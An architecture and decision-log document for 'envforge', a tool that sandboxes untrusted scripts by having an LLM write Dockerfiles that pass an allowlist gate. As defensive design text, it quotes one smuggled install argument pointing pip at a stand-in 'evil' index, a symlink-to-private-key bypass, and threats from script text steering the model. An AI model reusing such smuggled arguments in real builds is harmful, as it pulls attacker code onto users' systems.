# Architecture

Invariants and decisions, not a mirror of the code. If a sentence here restates what a
file does, it belongs in the file instead.

## The pipeline

    script.py
       |
       v
    LLM writes a Dockerfile  (forced strict tool call, one string field)
       |
       v
    gate: allowlist of six instructions, no continuations   --reject--> repair
       |                                                                  ^
       v                                                                  |
    build  (network ON, apt and pip need it)  ------------- fails --------+
       |                                                                  |
       v                                                                  |
    run  (network OFF, all caps dropped, non-root, read-only) -- fails ---+
       |                                                          bounded evidence
       v
    verdict  (computed from observed behaviour; LLM opinion advisory)   NOT BUILT

The repair loop is the single back-edge, capped. Every repaired Dockerfile re-enters the
same gate before any build.

## Invariants

1. The gate runs before every build, first generation and every repair alike, and the
   fallback Dockerfile we write ourselves passes through it too. One path to the daemon,
   whoever wrote the file.
2. The gate is an allowlist of permitted instructions, never a blocklist. This applies to
   characters as well as instructions: a Dockerfile may contain printable characters,
   newlines and tabs, and nothing else.
3. No Dockerfile may contain a line continuation; every physical line is blank, a
   comment, or begins with an allowlisted instruction. The gate splits on `\n` and
   nothing else, so its notion of a line is Docker's by construction.
4. Build has network. Run has none.
5. The run has a memory cap, a pids cap, a cpu cap, read-only root with a tmpfs,
   cap-drop ALL, no-new-privileges, and a non-root user.
6. Every container is named and force-removed in a `finally`.
7. No Docker socket is mounted anywhere, and the agent is never containerised.
8. Test arguments are passed only after the image name, so an ENTRYPOINT image receives
   them as argv and never as docker flags.
9. All container output is attacker-controlled text, and evidence is bounded before it
   reaches a prompt.
10. The verdict is computed from observed behaviour. The model's opinion is labelled
    advisory and can never flip it.
11. The written `FROM` equals the `base_image` the model declared separately, and names no
    registry host. The declaration is checkable without parsing the file it describes.
12. Every `COPY` destination resolves under `/app`, normalised before comparison rather
    than prefix-matched as a string.
13. `RUN` is exec form, so its arguments are a list checked one at a time rather than a
    string matched against a prefix.
14. A refusal by the model never spends a repair attempt; it has its own counter and then
    a fallback we wrote.
15. A language not in the table is refused before the model is consulted at all.
16. Only the workspace handles a path. Everything downstream receives names and contents.
17. No file in a build context may be named something the build itself interprets. A
    context file called `Dockerfile` replaces the gated one, and the container then runs
    instructions nothing checked.
18. Every reply from the model is charged to the run's ledger, whether it was usable or
    not. A refusal, a truncation and a schema failure all cost tokens, and a bound that
    charged only for successes could be walked past by a loop that never succeeds.
19. Every event an engine yields is one of a closed set, and every string it carries has
    its authors declared. An engine cannot invent a kind, and no record reaches a reader
    without saying whether we wrote it.

Invariants 4 and 5 are asserted against the argv that `sandbox.py` actually builds, so
dropping a flag from the code fails a test rather than passing review.

Invariants 2, 3, 12 and 17 each exist because an earlier version was bypassed, or in 17's
case because the absence of the rule was. The
history is in STATUS.md and it is the same lesson three times: a rule that checks the text
instead of the thing the text means is not a rule.

## Decision log

### ADR-006: LLM provider layer is a hand-rolled Protocol, not a framework
Decided 2026-08-22. `envforge/llm.py`: an `LLM` Protocol, `AnthropicLLM` (native SDK,
strict tool use, GA 2026-01), `OpenAICompatLLM` (openai SDK plus `base_url`, covering
OpenAI and Groq), `make_llm("provider:model")`. Rejected: one OpenAI client for all
three, because Anthropic's compatibility layer ignores `strict`, so the only
grammar-guaranteed structured output for Claude is native-API-only, and Anthropic labels
that layer non-production. Rejected: LiteLLM and LangChain's model classes, because a
650-line project with one call site cannot justify a dependency it cannot explain, and
the trace module needs the unwrapped wire JSON. Provider wire differences live in two
classes of about thirty lines each; argument validation is uniform above them.

### ADR-007: Dockerfile generation shape
Decided 2026-08-22. Forced strict tool call, two fields, `dockerfile` and
`base_image`, with `additionalProperties` false. The same call serves
generation and repair; repair is a full rewrite, never a diff. The gate bans line
continuations, so every physical line starts with an allowlisted instruction. Rejected:
raw text with fence stripping, because the extraction heuristic becomes a second parser
standing in front of the gate. Rejected: structured fields plus a renderer, because the
schema either stays too rigid for real scripts or grows into a shadow Dockerfile AST,
and the gate would then validate our own template rather than the untrusted artifact.
Note: the grammar guarantee holds on Anthropic and OpenAI; Groq is a forced call plus
validation.

### ADR-008: who owns an ambiguous exit code
Decided 2026-08-22, revised 2026-08-23 after an experiment. Exit 125 is returned when the
docker CLI rejects our command, and a script may exit 125 to imitate that. `--cidfile`
settles it, because docker writes that file only once the container exists: absent means
our bug and raises, present means the script's behaviour and is returned as data.

126 and 127 have the same imitation problem and were first handled by an attempt cap
alone. A probe found the witness: `State.Error` on the container carries the runc message
when the process never started, and is empty when a script chose the code. The loop now
asks whether the container started rather than what number it produced, so there is no
code list to maintain. Rejected: trusting the exit code, because a faked 126 pulls the
loop into a repair that cannot help and the run already produced its evidence.

### ADR-009: the gate is an allowlist of instructions, and RUN is exec form
Decided 2026-08-23, RUN revised 2026-08-24. Six instructions and nothing else. RUN began
as a shell string with a banned-metacharacter list, which was a proxy for "no shell will
interpret this" and had collateral: `>` and `<` are redirection operators and version
specifiers at once, so `pip install "flask>=2.0"` was refused. Exec form removes the shell,
making the proxy unnecessary rather than relaxed, and turns the command into a list whose
arguments are checked individually. That closed a second hole in the same change: as a
string prefix, `pip install` also matched `pip install --index-url https://evil/ foo`.

What the gate does not do is part of the decision. `pip install <name>` runs that package's
setup code at build time with network, and no instruction allowlist can prevent that
because installing packages is the product. Containment is the container. The mitigations
are offline installs after pre-resolution, and an egress allowlist, and neither lives here.

### ADR-010: a refusal is not a repair
Decided 2026-08-23. The model may decline to write a Dockerfile for a script that looks
hostile. That is not repairable by rewriting, so it gets its own counter: one retry, then a
fallback Dockerfile we write ourselves, which passes the same gate. The reason for the
refusal is kept as a structure and reported beside observed behaviour, labelled advisory.
It never gates, because the script under test is inside the prompt and therefore writes
part of the text the model judged. Rejected: retrying until the model complies, which reads
as a loop that asks until the classifier gives up.

### ADR-011: the language label comes from the file extension
Decided 2026-08-25. One `LANGUAGES` table holds extensions, base image, command and the
sibling filenames worth gathering, so adding a language is one entry rather than several
that can disagree. The gate does not import it and has no business knowing what language
anything is. Rejected: asking the model, not because it is a security boundary (it is not;
the door check bounds the answer either way) but because it would send attacker text to a
model before the door check on every run, and would let a script steer its own label with a
comment.

### ADR-012: only the workspace handles a path
Decided 2026-08-25. Tools and the sandbox receive names and contents. Everything that can
go wrong with a filesystem happens once, at ingestion. Symlinks are resolved and then
checked for containment, in that order, because a prefix test on the joined path passes a
`requirements.txt` symlinked to a private key. The script and its siblings are treated
differently: a symlinked script is followed, since the user named it, and the root becomes
wherever it actually lives; siblings were discovered rather than named and may not leave
that root. `Sandbox.build` takes those contents rather than a path, so the script is read
exactly once and the bytes the model reviewed are the bytes the container runs.

### ADR-013: the outcome carries totals, the event stream carries the bodies
Decided 2026-08-25, revised 2026-08-27. `Outcome` held every `Call`, and a `Call` holds the
full request and response JSON. Harmless at four small calls and megabytes once a tool loop
runs fifteen turns, on the one event every consumer must hold. It now carries a `Usage` of
counts and token totals plus a full UUID `run_id`; the whole `Call` rides the `wrote` event,
which carries the same `run_id`. `Usage.calls` counts every request sent to the model, and
since invariant 18 its token totals count every reply that reported a usage, a refusal and a
truncation included, rather than successes alone. Rejected: dropping the bodies until
the trace module exists, which would lose the wire JSON the trace is being built to record.

Raw provider bodies for refusals, truncations and invalid replies are not yet preserved.
They need error types that retain provider wire data, so the trace module owns
that design rather than adding half a trace to the repair loop.

### ADR-014: the engine seam is a labelled vocabulary, not a topology
Decided 2026-08-27. `envforge/events.py` holds the twelve kinds an engine may yield, and
`Event` refuses anything else at construction. The plain loop and the LangGraph port both
honour it, which a node-shaped interface could not be: a plain loop has no nodes.

Each kind declares the authors of its message and of every data key, as a set rather than
one value, because most of these strings have more than one: `gate_rejected` is our
sentence quoting the model's line. Choosing a single label would mean ranking a model
against a container and there is no honest ranking there, while the question a renderer
asks is answered by `authors() == {US}` or not.

The labels are declared per kind and are the union over every path emitting it, so
`finished` carries `INPUT` because one of its five paths names the language the caller
asked for. Rejected: a label chosen at each emission, which is more precise and is not a
contract, since nothing can check that an emitter filled it in honestly.

Nothing reads the labels yet; the trace module will. They are written now because only
the code emitting an event knows who wrote the strings in it, so this is the one property
that cannot be added afterwards.

### ADR-015: the model spend is bounded in tokens, with a reserve
Decided 2026-08-27. `envforge/budget.py`. A turn cap measures nothing, because every turn
resends everything before it and the tenth costs several times the first. The bound is a
token total instead, and `max_attempts` stays alongside it: an attempt builds an image and
runs a container, which is a cost tokens do not measure, so the two currencies keep two
bounds.

Part of the total is reserved and cannot be spent on investigation. The tool loop
will read files before it writes anything, and a loop that spends its last token on one more
file read has bought knowledge it can no longer use. `can_investigate` asks the question
with the reserve held back and `can_write` asks it without; nothing calls the first until
the tool loop lands, and it exists now because a loop written against a turn counter is a rewrite
rather than an argument.

A spent budget falls back to the Dockerfile we write ourselves, the same shape as a second
refusal. Paying for everything up to that point and producing no image is the one outcome
worth avoiding.

The estimate gates and the provider's numbers record. `estimate` errs high in both halves,
a characters-per-token rate below the real one and a reply assumed to run to the output
ceiling, so the loop stops one call early rather than one call late. An overestimate is
never written into the ledger and refunded later, because that pessimism would compound
until the budget was a turn cap under another name. The ceiling half holds on all three
providers: Anthropic is sent `max_tokens` and the two OpenAI-compatible ones are sent
`max_completion_tokens`, which both document as the replacement for the deprecated name.
Until 2026-08-30 `OpenAICompatLLM` sent no ceiling at all, so on that path one reply could
overshoot the whole budget before the next call was refused, and `Truncated` could never
fire. A bound that holds on one provider out of three is not a bound.

`Budget` is frozen and holds no counters. An `Agent` is built once and may be run more
than once, and a budget carrying its own spent total would let the first run bound the
second.

## What crosses each boundary

| from | to | payload |
|---|---|---|
| CLI | agent | script path, model spec, caps  *(no CLI exists yet)* |
| agent | LLM | script text, language, bounded failure evidence |
| LLM | gate | Dockerfile text, declared base image |
| gate | sandbox | approved Dockerfile, or a rejection reason |
| sandbox | agent | exit code, bounded stdout and stderr, timing |
| agent | verdict | what was attempted, what the cage stopped  *(no verdict exists yet)* |
| workspace | agent | filenames and contents, never a path |
